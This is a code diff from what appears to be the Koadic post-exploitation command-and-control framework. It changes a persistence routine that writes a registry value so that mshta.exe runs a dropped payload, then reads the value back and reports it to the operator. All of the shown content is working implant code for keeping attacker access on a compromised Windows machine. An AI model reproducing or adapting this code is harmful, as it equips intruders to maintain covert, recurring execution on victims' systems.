@@ -29,9 +29,7 @@ try
     }
     else
     {
-        var dropdir = Koadic.shell.exec("echo ~FDROPDIR~", "~DIRECTORY~\\"+Koadic.uuid()+".txt");
-        dropdir = dropdir.split(" \r\n")[0];
-        Koadic.registry.write(~FHKEY~, path, key, "C:\\Windows\\system32\\mshta.exe "+dropdir+"\\~FDROPFILE~", Koadic.registry.STRING);
+        Koadic.registry.write(~FHKEY~, path, key, "C:\\Windows\\system32\\mshta.exe "+droppath, Koadic.registry.STRING);
         headers["Task"] = "AddKey";
         var retval = Koadic.registry.read(~FHKEY~, path, key, Koadic.registry.STRING).SValue;
         Koadic.work.report(retval, headers);
